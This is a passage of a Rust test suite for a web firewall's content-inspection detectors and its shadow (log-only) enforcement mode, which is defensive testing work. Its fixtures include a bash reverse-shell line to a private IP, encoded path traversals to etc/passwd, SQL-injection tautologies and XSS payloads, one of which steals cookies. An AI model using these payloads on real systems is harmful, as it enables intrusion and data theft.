            text: Cow::Borrowed("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            lower_trunc: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1".to_string(),
            provenance: Provenance::Raw,
        };
        let mut st = ContentInspectionState::default();
        let finding = det
            .detect(&view, &pctx, &mut st)
            .expect("rce must fire on reverse shell");
        assert_eq!(finding.rule_key, "rce.reverse_shell");
        assert_eq!(finding.attack, AttackKind::Rce);
        let signal = view.to_signal(det.id(), InspectionScope::Body, finding);
        let verdict = score(std::slice::from_ref(&signal), &sub.config().scoring, false);
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Block,
            "confidence 92 (weight 1.0) reaches the block threshold (80)"
        );
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) downgrades a genuine RCE Block to Log"
        );
    }

    #[test]
    fn real_traversal_detector_fires_but_shadow_never_blocks() {
        // The Traversal T1 detector fires on an overlong-encoded traversal (conf
        // 82 ≥ block threshold 80) → scorer recommends Block → shadow → Log.
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("traversal", "traversal"));
        let det = TraversalStructuralDetector::new();
        let req = ctx();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let view = View {
            location: Cow::Borrowed("body"),
            round: 1,
            text: Cow::Borrowed("..%c0%af..%c0%afetc/passwd"),
            lower_trunc: "..%c0%af..%c0%afetc/passwd".to_string(),
            provenance: Provenance::UrlDecoded,
        };
        let mut st = ContentInspectionState::default();
        let finding = det
            .detect(&view, &pctx, &mut st)
            .expect("traversal must fire on overlong");
        assert_eq!(finding.rule_key, "traversal.overlong");
        assert_eq!(finding.attack, AttackKind::Traversal);
        let signal = view.to_signal(det.id(), InspectionScope::Body, finding);
        let verdict = score(std::slice::from_ref(&signal), &sub.config().scoring, false);
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Block,
            "confidence 82 (weight 1.0) reaches the block threshold (80)"
        );
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) downgrades a genuine Traversal Block to Log"
        );
    }

    #[test]
    fn laneb_json_unicode_escaped_sqli_fires_only_via_field_extraction() {
        // Lane B acceptance (k3 probe): a SQLi tautology whose quotes are JSON
        // `'`-escaped. The whole-body view carries the LITERAL `'`, so the
        // AST SQLi detector never sees a tautology on it (score 0, the bypass). With
        // structured extraction the JSON leaf is unescaped to `1' OR '1'='1` and the
        // production `AstSqlDetector` fires — driven through the REAL
        // `evaluate_scoped` (preprocess → extraction → detector → score). Shadow
        // keeps it advisory.
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("sql_injection", "ast"));
        // The body carries the LITERAL six-byte `'` sequences (JSON escape for
        // an apostrophe); only JSON parsing turns them into the `'` quotes that form
        // the tautology, so the whole-body view never sees a quote-breakout.
        let escaped = b"{\"q\":\"1\\u0027 OR \\u00271\\u0027=\\u00271\"}";

        // Control: the escaped leaf as a NON-structured (form-encoded) body, so no
        // extraction runs. The whole-body view carries the literal `'`, the
        // AST detector never sees a quote-breakout, and no SQLi signal is produced —
        // this is the bypass the extraction closes.
        let mut plain = ctx();
        plain.body_preview = Bytes::from_static(b"q=1\\u0027 OR \\u00271\\u0027=\\u00271");
        plain.content_length = plain.body_preview.len() as u64;
        let mut st0 = ContentInspectionState::default();
        let plain_sqli = match sub.evaluate_scoped(&plain, InspectionScope::Body, &mut st0) {
            ContentVerdict::Semantic(v) => v.signals.iter().any(|s| s.attack == AttackKind::SqlInjection),
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        assert!(
            !plain_sqli,
            "without extraction the escaped tautology must NOT fire (the bypass)"
        );

        // With `application/json`, extraction unescapes the leaf and the detector fires.
        let mut req = ctx();
        req.headers
            .insert("content-type".to_string(), "application/json".to_string());
        req.body_preview = Bytes::copy_from_slice(&escaped[..]);
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        let sig = verdict
            .signals
            .iter()
            .find(|s| s.attack == AttackKind::SqlInjection)
            .expect("the extracted JSON leaf must produce a SQLi signal");
        assert_eq!(*sig.field, *"body.json", "the signal came from the extracted JSON leaf");
        assert!(
            sig.rule_key.starts_with("ast."),
            "a real AST SQLi rule_key: {}",
            sig.rule_key
        );
        assert!(
            verdict.request_score > 0,
            "the extracted leaf must raise the score above 0"
        );
    }

    #[test]
    fn lane1_clean_shell_normalised_rce_fires_through_production_pipeline() {
        // codex A-2/A-3/A-4 acceptance: a quote/`$IFS`-split `python3 -c id` that
        // Lane 1's URL-decode-only path never reveals. Driven through the REAL
        // `evaluate_scoped` (preprocess → detector → score), it must (a) leave Lane
        // 1 clean (→ Semantic, not LegacyVeto) and (b) produce an RCE signal on a
        // BlindDecoded (shell-normalised) view — a default-on rule the OLD gate
        // dropped. Shadow resolves the Block recommendation to Log.
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("rce", "rce"));
        let mut req = ctx();
        req.body_preview = Bytes::from_static(b"cmd=pyth''on3$IFS-c$IFSid");
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        let sig = verdict
            .signals
            .iter()
            .find(|s| s.attack == AttackKind::Rce)
            .expect("the shell-normalised view must produce an RCE signal");
        assert_eq!(
            sig.provenance,
            Provenance::BlindDecoded,
            "the RCE signal came through shell normalisation (blind, never hard-veto)"
        );
        assert!(
            sig.rule_key.starts_with("rce."),
            "a real RCE rule_key: {}",
            sig.rule_key
        );
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Block,
            "python -c (confidence 82) reaches the block threshold (80)"
        );
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) downgrades the genuine RCE Block to Log"
        );
    }

    #[test]
    fn lane1_clean_base64_traversal_fires_through_production_pipeline() {
        // codex A-2 acceptance: a base64-wrapped `../../../etc/passwd` — invisible
        // to Lane 1 (it never decodes base64) — surfaces a Traversal T1 signal on a
        // BlindDecoded view through the production pipeline, and shadow keeps it
        // advisory (Log).
        use base64::Engine as _;
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("traversal", "traversal"));
        let payload = base64::engine::general_purpose::STANDARD.encode("../../../etc/passwd");
        let mut req = ctx();
        req.body_preview = Bytes::from(format!("file={payload}"));
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        let sig = verdict
            .signals
            .iter()
            .find(|s| s.attack == AttackKind::Traversal)
            .expect("the base64 blind decode must produce a Traversal signal");
        assert_eq!(
            sig.provenance,
            Provenance::BlindDecoded,
            "the Traversal signal came through base64 blind decode"
        );
        assert!(
            sig.rule_key.starts_with("traversal."),
            "a real Traversal rule_key: {}",
            sig.rule_key
        );
        // sensitive_abs (68) ≥ log threshold (40), below block (80) → Log.
        assert_eq!(verdict.recommendation, SemanticAction::Log);
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow keeps the traversal advisory"
        );
    }

    #[test]
    fn lane1_clean_base64_fully_double_encoded_traversal_fires_through_production_pipeline() {
        // codex A-4 must-fix acceptance: a base64-wrapped FULLY double-encoded
        // traversal (`%252e%252e%252fetc%252fpasswd` — every byte, including the
        // separator, double-percent-encoded) must still clear the shared blind
        // gate and fire `traversal.encoded_dotdot` once the separator set is
        // corrected to accept `%252f`/`%255c`. Before the fix this literal (no
        // raw `/etc/passwd`, no single-encoded separator) would have been
        // invisible: the gate only recognised a further encoded *dot* as a valid
        // continuation, never the fully double-encoded separator itself.
        use base64::Engine as _;
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("traversal", "traversal"));
        let payload = base64::engine::general_purpose::STANDARD.encode("%252e%252e%252fetc%252fpasswd");
        let mut req = ctx();
        req.body_preview = Bytes::from(format!("file={payload}"));
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        let sig = verdict
            .signals
            .iter()
            .find(|s| s.attack == AttackKind::Traversal)
            .expect("the fully double-encoded traversal must clear the blind gate and fire");
        assert_eq!(
            sig.provenance,
            Provenance::BlindDecoded,
            "the Traversal signal came through base64 blind decode"
        );
        assert_eq!(
            sig.rule_key, "traversal.encoded_dotdot",
            "must fire the corrected encoded_dotdot rule, not sensitive_abs (no raw /etc/passwd appears)"
        );
        // encoded_dotdot (75) ≥ log threshold (40), below block (80) → Log.
        assert_eq!(verdict.recommendation, SemanticAction::Log);
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow keeps the fully double-encoded traversal advisory (not blocked)"
        );
    }

    // ── P2: AST SQLi detector fires but shadow never blocks ───────────────────

    /// Enabled `log_only` (shadow) config for the `SqlInjection` family with BOTH
    /// detectors weighted 0.5 / 0.5 (the shipped default.toml posture).
    fn sqli_two_detector_log_only_rt() -> RuntimeContentSecurityConfig {
        let mut weights = BTreeMap::new();
        weights.insert("struct_rule".to_string(), 0.5);
        weights.insert("ast".to_string(), 0.5);
        let mut attacks = BTreeMap::new();
        attacks.insert(
            "sql_injection".to_string(),
            SemanticAttackConfig {
                enabled: true,
                weights,
                log_threshold: 40,
                block_threshold: 80,
                hard_veto_allowlist: Vec::new(),
            },
        );
        let cfg = ContentSecurityConfig {
            enabled: true,
            enforcement_mode: "log_only".to_string(),
            attacks,
            ..ContentSecurityConfig::default()
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn real_ast_sqli_detector_fires_but_shadow_never_blocks() {
        // The production AstSqlDetector fires on a quote-breakout tautology
        // (`1' or '1'='1`). Lane 1's libinjection would veto this raw payload first,
        // so — like the sibling structural/RCE/traversal shadow tests — we drive the
        // Lane 2 detector → scoring → shadow-resolve pipeline directly. With ast
        // weight 0.5, a single detector reaches only Log; the point here is that the
        // AST detector genuinely fires and shadow never blocks.
        let sub = ContentSecuritySubsystem::with_config(sqli_two_detector_log_only_rt());
        let det = AstSqlDetector::new();
        let req = ctx();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let view = View {
            location: Cow::Borrowed("body"),
            round: 0,
            text: Cow::Borrowed("1' or '1'='1"),
            lower_trunc: "1' or '1'='1".to_string(),
            provenance: Provenance::Raw,
        };
        let mut st = ContentInspectionState::default();
        let finding = det
            .detect(&view, &pctx, &mut st)
            .expect("the AST detector must fire on the quote-breakout tautology");
        assert_eq!(finding.rule_key, "ast.tautology");
        assert_eq!(finding.attack, AttackKind::SqlInjection);
        let signal = view.to_signal(det.id(), InspectionScope::Body, finding);
        let verdict = score(std::slice::from_ref(&signal), &sub.config().scoring, false);
        assert!(!verdict.signals.is_empty(), "detection evidence must be recorded");
        // 0.5 · 80 = 40 ≥ log threshold (40) → Log recommendation; shadow keeps it.
        assert_eq!(verdict.recommendation, SemanticAction::Log);
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) never blocks an AST SQLi detection"
        );
    }

    #[test]
    fn ast_and_structural_corroborate_to_block_recommendation_still_shadow() {
        // Both SQLi detectors fire on the same field: `1 and sleep(5)` →
        // structural sql.dangerous_fn (85) AND ast.dangerous_fn (85). With 0.5 / 0.5
        // the group score is 0.5·85 + 0.5·85 = 85 ≥ block (80): corroboration by
        // BOTH detectors is what crosses the Block bar (neither alone can — 0.5·85 =
        // 42.5 is only Log) — yet shadow still downgrades the effective action to
        // Log. The primary is the deterministic within-group winner (struct_rule).
        let sub = ContentSecuritySubsystem::with_config(sqli_two_detector_log_only_rt());
        let req = ctx();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let payload = "1 and sleep(5)";
        let view = View {
            location: Cow::Borrowed("body"),
            round: 0,
            text: Cow::Borrowed(payload),
            lower_trunc: payload.to_string(),
            provenance: Provenance::Raw,
        };
        let mut st = ContentInspectionState::default();
        let struct_sig = {
            let f = StructuralSqlDetector::new()
                .detect(&view, &pctx, &mut st)
                .expect("structural dangerous_fn fires");
            assert_eq!(f.rule_key, "sql.dangerous_fn");
            view.to_signal(DetectorId::StructRule, InspectionScope::Body, f)
        };
        let ast_sig = {
            let f = AstSqlDetector::new()
                .detect(&view, &pctx, &mut st)
                .expect("ast dangerous_fn fires");
            assert_eq!(f.rule_key, "ast.dangerous_fn");
            view.to_signal(DetectorId::Ast, InspectionScope::Body, f)
        };
        // Single detector alone is only Log (42.5 < block 80).
        let struct_only = score(std::slice::from_ref(&struct_sig), &sub.config().scoring, false);
        assert_eq!(
            struct_only.recommendation,
            SemanticAction::Log,
            "one detector alone is only Log"
        );
        // Corroboration crosses the block bar.
        let verdict = score(&[struct_sig, ast_sig], &sub.config().scoring, false);
        assert_eq!(verdict.request_score, 85, "0.5·85 + 0.5·85 = 85");
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Block,
            "corroboration by both detectors crosses the block threshold"
        );
        assert_eq!(
            verdict.primary_result.as_ref().and_then(|r| r.rule_id.as_deref()),
            Some("sql.dangerous_fn"),
            "within-group primary is the deterministic tie-break winner (struct_rule)"
        );
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) downgrades the corroborated Block to Log"
        );
    }

    #[test]
    fn lane1_clean_base64_sqli_fires_ast_through_production_pipeline() {
        // A base64-wrapped `1 union select …` — invisible to Lane 1 (never decodes
        // base64) — surfaces an AST SQLi signal on a BlindDecoded view through the
        // real `evaluate_scoped` pipeline, and shadow keeps it advisory. Proves the
        // encoding-bypass → decode-chain → AST path, and that a BlindDecoded AST
        // signal is (correctly) never hard-veto-capable.
        use base64::Engine as _;
        let sub = ContentSecuritySubsystem::with_config(sqli_two_detector_log_only_rt());
        let payload = base64::engine::general_purpose::STANDARD.encode("1 union select null,null,null from users");
        let mut req = ctx();
        req.body_preview = Bytes::from(format!("q={payload}"));
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        let ast_sig = verdict
            .signals
            .iter()
            .find(|s| s.detector == DetectorId::Ast && s.attack == AttackKind::SqlInjection)
            .expect("the base64 blind decode must surface an AST SQLi signal");
        assert_eq!(
            ast_sig.provenance,
            Provenance::BlindDecoded,
            "the AST signal came through base64 blind decode (never hard-veto)"
        );
        assert_eq!(ast_sig.rule_key, "ast.union");
        // Shadow: whatever the recommendation, the effective action is never Block.
        assert_ne!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Block,
            "shadow (log_only) never blocks the base64-wrapped AST SQLi"
        );
    }

    // ── P-XSS-1: XSS DOM detector fires but shadow never blocks ───────────────

    #[test]
    fn real_xss_detector_fires_but_shadow_never_blocks() {
        // The production XssDomDetector fires on a `<svg onload>` (conf 88 ≥ block
        // threshold 80) so the scorer recommends EXACTLY Block — yet the default
        // log_only posture downgrades the effective action to Log. Lane 1 would veto
        // this raw payload first, so we drive the Lane 2 pipeline directly (as the
        // sibling SQLi/RCE/Traversal shadow tests do).
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("xss", "xss_dom"));
        let det = XssDomDetector::new();
        let req = ctx();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let view = View {
            location: Cow::Borrowed("body"),
            round: 0,
            text: Cow::Borrowed("<svg onload=alert(1)>"),
            lower_trunc: "<svg onload=alert(1)>".to_string(),
            provenance: Provenance::Raw,
        };
        let mut st = ContentInspectionState::default();
        let finding = det.detect(&view, &pctx, &mut st).expect("xss must fire on svg onload");
        assert_eq!(finding.rule_key, "xss.svg_onload");
        assert_eq!(finding.attack, AttackKind::Xss);
        let signal = view.to_signal(det.id(), InspectionScope::Body, finding);
        let verdict = score(std::slice::from_ref(&signal), &sub.config().scoring, false);
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Block,
            "confidence 88 (weight 1.0) reaches the block threshold (80)"
        );
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) downgrades a genuine XSS Block to Log"
        );
    }

    #[test]
    fn lane1_clean_base64_xss_fires_through_production_pipeline() {
        // A base64-wrapped `<svg onload=…>` — invisible to Lane 1 (it never decodes
        // base64) — surfaces an XSS DOM signal on a BlindDecoded view through the
        // real `evaluate_scoped` pipeline, and shadow keeps it advisory. Proves the
        // encoding-bypass → decode-chain → DOM path, and that a BlindDecoded XSS
        // signal is (correctly) never hard-veto-capable.
        use base64::Engine as _;
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("xss", "xss_dom"));
        // Payload chosen so its STANDARD base64 has no `+` (which URL-decode would
        // turn into a space and corrupt the token before the blind decoder sees it).
        let payload = base64::engine::general_purpose::STANDARD.encode("<svg onload=alert(11)>");
        let mut req = ctx();
        req.body_preview = Bytes::from(format!("q={payload}"));
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        let sig = verdict
            .signals
            .iter()
            .find(|s| s.attack == AttackKind::Xss)
            .expect("the base64 blind decode must surface an XSS signal");
        assert_eq!(
            sig.provenance,
            Provenance::BlindDecoded,
            "the XSS signal came through base64 blind decode (never hard-veto)"
        );
        assert!(
            sig.rule_key.starts_with("xss."),
            "a real XSS rule_key: {}",
            sig.rule_key
        );
        assert_ne!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Block,
            "shadow (log_only) never blocks the base64-wrapped XSS"
        );
    }

    #[test]
    fn lane1_clean_base64_body_onload_fires_through_production_pipeline() {
        // FN-1 net-leak proof: a base64-wrapped `<body onload=…>` — invisible to
        // Lane 1 (never decodes base64) AND dropped by the body-context fragment
        // parse — must still surface an XSS DOM signal on the BlindDecoded view via
        // the document reparse, through the real `evaluate_scoped` pipeline. Shadow
        // keeps it advisory.
        use base64::Engine as _;
        let sub = ContentSecuritySubsystem::with_config(single_family_log_only_rt("xss", "xss_dom"));
        // STANDARD base64 of `<body onload=alert(11)>` has no `+`/`/` (a `+` would
        // URL-decode to a space and corrupt the token before the blind decoder).
        let payload = base64::engine::general_purpose::STANDARD.encode("<body onload=alert(11)>");
        let mut req = ctx();
        req.body_preview = Bytes::from(format!("q={payload}"));
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        let sig = verdict
            .signals
            .iter()
            .find(|s| s.attack == AttackKind::Xss)
            .expect("the base64 blind decode + document reparse must surface an XSS signal");
        assert_eq!(
            sig.provenance,
            Provenance::BlindDecoded,
            "the XSS signal came through base64 blind decode (never hard-veto)"
        );
        assert_eq!(
            sig.rule_key, "xss.event_handler",
            "a body onload handler recovered by the document reparse"
        );
        assert_ne!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Block,
            "shadow (log_only) never blocks the base64-wrapped body onload"
        );
    }

    /// Build an enabled `log_only` runtime config for the shipped two-detector XSS
    /// family (`xss_dom`/`xss_js` weighted 0.5/0.5, P-XSS-2).
    fn xss_corroboration_rt() -> RuntimeContentSecurityConfig {
        let mut weights = BTreeMap::new();
        weights.insert("xss_dom".to_string(), 0.5);
        weights.insert("xss_js".to_string(), 0.5);
        let mut attacks = BTreeMap::new();
        attacks.insert(
            "xss".to_string(),
            SemanticAttackConfig {
                enabled: true,
                weights,
                log_threshold: 40,
                block_threshold: 80,
                hard_veto_allowlist: Vec::new(),
            },
        );
        let cfg = ContentSecurityConfig {
            enabled: true,
            enforcement_mode: "log_only".to_string(),
            attacks,
            ..ContentSecurityConfig::default()
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn xss_dom_js_corroboration_blocks_but_shadow_downgrades() {
        // P-XSS-2 end-to-end: a base64-wrapped `<svg onload=eval(document.cookie)>` —
        // invisible to Lane 1 — surfaces BOTH XSS signals on the same BlindDecoded view
        // via the real pipeline: `xss_dom` (svg_onload structure) + `xss_js`
        // (`document.cookie` exfil — a genuine credential-theft action, not merely
        // "this is JS"). Their 0.5/0.5 sum reaches the Block threshold, yet shadow
        // (log_only) downgrades the effective action to Log.
        use base64::Engine as _;
        let sub = ContentSecuritySubsystem::with_config(xss_corroboration_rt());
        // STANDARD base64 of `<svg onload=eval(document.cookie)>` has no `+`/`/` (a `+`
        // would url-decode to a space and corrupt the token before the blind decoder).
        let payload = base64::engine::general_purpose::STANDARD.encode("<svg onload=eval(document.cookie)>");
        let mut req = ctx();
        req.body_preview = Bytes::from(format!("q={payload}"));
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        // Both detectors corroborate on the same field.
        let dom = verdict
            .signals
            .iter()
            .find(|s| s.detector == DetectorId::XssDom && s.attack == AttackKind::Xss)
            .expect("xss_dom must fire (svg onload structure)");
        let js = verdict
            .signals
            .iter()
            .find(|s| s.detector == DetectorId::XssJs && s.attack == AttackKind::Xss)
            .expect("xss_js must corroborate (eval sink in the handler value)");
        assert_eq!(dom.rule_key, "xss.svg_onload");
        assert_eq!(js.rule_key, "xss.js_exfil");
        assert_eq!(dom.field, js.field, "both signals land on the SAME field");
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Block,
            "0.5·88 + 0.5·88 = 88 ≥ block threshold 80 → Block recommendation"
        );
        // Shadow-not-block red line: a corroborated Block is still downgraded to Log.
        assert_eq!(
            sub.resolve_action(verdict.recommendation),
            SemanticAction::Log,
            "shadow (log_only) downgrades even a corroborated XSS Block to Log"
        );
    }

    #[test]
    fn xss_single_detector_only_logs_through_pipeline() {
        // A base64-wrapped `<svg onload=setTimeout(f,9)>` — a REAL handler running
        // genuine JS, but a *benign* timer, not an attack-specific action. Under the
        // old wide token table `setTimeout` fired `xss_js` and corroborated this legit
        // handler to Block; after the narrowing `xss_js` stays silent, so only `xss_dom`
        // (structure) fires. Its lone 0.5 × 88 = 44 stays at Log, never Block —
        // corroboration is reserved for genuinely attack-specific JS.
        use base64::Engine as _;
        let sub = ContentSecuritySubsystem::with_config(xss_corroboration_rt());
        let payload = base64::engine::general_purpose::STANDARD.encode("<svg onload=setTimeout(f,9)>");
        let mut req = ctx();
        req.body_preview = Bytes::from(format!("q={payload}"));
        req.content_length = req.body_preview.len() as u64;
        let mut st = ContentInspectionState::default();
        let verdict = match sub.evaluate_scoped(&req, InspectionScope::Body, &mut st) {
            ContentVerdict::Semantic(v) => v,
            other => panic!("Lane 1 must stay clean → Semantic, got {other:?}"),
        };
        assert!(
            verdict
                .signals
                .iter()
                .any(|s| s.detector == DetectorId::XssDom && s.attack == AttackKind::Xss),
            "xss_dom fires on the svg onload structure"
        );
        assert!(
            !verdict.signals.iter().any(|s| s.detector == DetectorId::XssJs),
            "xss_js must NOT fire — `setTimeout` is a benign timer, not an attack-specific token"
        );
        assert_eq!(
            verdict.recommendation,
            SemanticAction::Log,
            "a lone structural hit (0.5 × 88 = 44) stays at Log, never Block"
        );
    }

    // ── A-2: enforcement_mode three-state dispatch truth table ────────────────

    /// Build an enabled runtime config in the given enforcement mode with the
    /// mock-firing `SQLi` family weighted on `struct_rule`.
    fn enabled_rt_with_mode(mode: &str) -> RuntimeContentSecurityConfig {
        let cfg = ContentSecurityConfig {
            enforcement_mode: mode.to_string(),
            ..enabled_enforce_source()
        };
        RuntimeContentSecurityConfig::compile(&cfg).expect("valid")
    }

    #[test]
    fn mode_off_produces_no_semantic_verdict_even_with_firing_detector() {
        // enabled=true but enforcement_mode=off → the lane does NO work: no
        // preprocessing, no detection, no verdict. `evaluate_scoped` returns None
        // exactly like a disabled lane, so nothing is ever logged or persisted.
        let mut sub = ContentSecuritySubsystem::with_config(enabled_rt_with_mode("off"));
        sub.detectors.push(Box::new(MockSqliDetector { confidence: 100 }));
        let mut st = ContentInspectionState::default();
        let v = sub.evaluate_scoped(&ctx(), InspectionScope::Body, &mut st);
        assert!(
            matches!(v, ContentVerdict::None),
            "off mode must produce no Semantic verdict (no action at all), got {v:?}"
        );
    }

    #[test]
    fn mode_log_only_and_enforce_both_run_the_lane() {
        // log_only and enforce both RUN the lane (produce a Semantic verdict with
        // signals). The difference between them is only in `resolve_action`, and
        // in P1b even enforce is shadow at the engine dispatch (never blocks).
        for mode in ["log_only", "enforce"] {
            let mut sub = ContentSecuritySubsystem::with_config(enabled_rt_with_mode(mode));
            sub.detectors.push(Box::new(MockSqliDetector { confidence: 100 }));
            let mut st = ContentInspectionState::default();
            match sub.evaluate_scoped(&ctx(), InspectionScope::Body, &mut st) {
                ContentVerdict::Semantic(v) => {
                    assert!(!v.signals.is_empty(), "{mode}: the lane must run and produce signals");
                    assert_eq!(
                        v.recommendation,
                        SemanticAction::Block,
                        "{mode}: mock conf 100 → Block rec"
                    );
                }
                other => panic!("{mode}: expected Semantic, got {other:?}"),
            }
        }
    }

    #[test]
    fn resolve_action_effective_action_truth_table_off_log_enforce() {
        // codex A-2: the P1b engine-facing resolver's EFFECTIVE action per mode.
        // off → None, log_only → Log, enforce → Log (enforce is EXACTLY log_only
        // in P1b — never Block). A `None` recommendation always stays `None`.
        let off = ContentSecuritySubsystem::with_config(enabled_rt_with_mode("off"));
        assert_eq!(
            off.resolve_action(SemanticAction::Block),
            SemanticAction::None,
            "off → None (no action at all)"
        );
        assert_eq!(off.resolve_action(SemanticAction::None), SemanticAction::None);

        let log_only = ContentSecuritySubsystem::with_config(enabled_rt_with_mode("log_only"));
        assert_eq!(
            log_only.resolve_action(SemanticAction::Block),
            SemanticAction::Log,
            "log_only → Log (a Block recommendation is capped at Log)"
        );
        assert_eq!(
            log_only.resolve_action(SemanticAction::None),
            SemanticAction::None,
            "log_only: a None recommendation stays None"
        );

        let enforce = ContentSecuritySubsystem::with_config(enabled_rt_with_mode("enforce"));
        assert_eq!(
            enforce.resolve_action(SemanticAction::Block),
            SemanticAction::Log,
            "enforce → Log in P1b (EXACTLY log_only, never Block)"
        );
        assert_eq!(
            enforce.resolve_action(SemanticAction::None),
            SemanticAction::None,
            "enforce: a None recommendation stays None"
        );
    }

    /// Shared serializable source for the enabled-enforce config, reused with a
    /// different `enforcement_mode` above.
    fn enabled_enforce_source() -> ContentSecurityConfig {
        let mut weights = BTreeMap::new();
        weights.insert("struct_rule".to_string(), 1.0);
        let mut attacks = BTreeMap::new();
        attacks.insert(
            "sql_injection".to_string(),
            SemanticAttackConfig {
                enabled: true,
                weights,
                log_threshold: 40,
                block_threshold: 80,
                hard_veto_allowlist: Vec::new(),
            },
        );
        ContentSecurityConfig {
            enabled: true,
            attacks,
            ..ContentSecurityConfig::default()
        }
    }
}
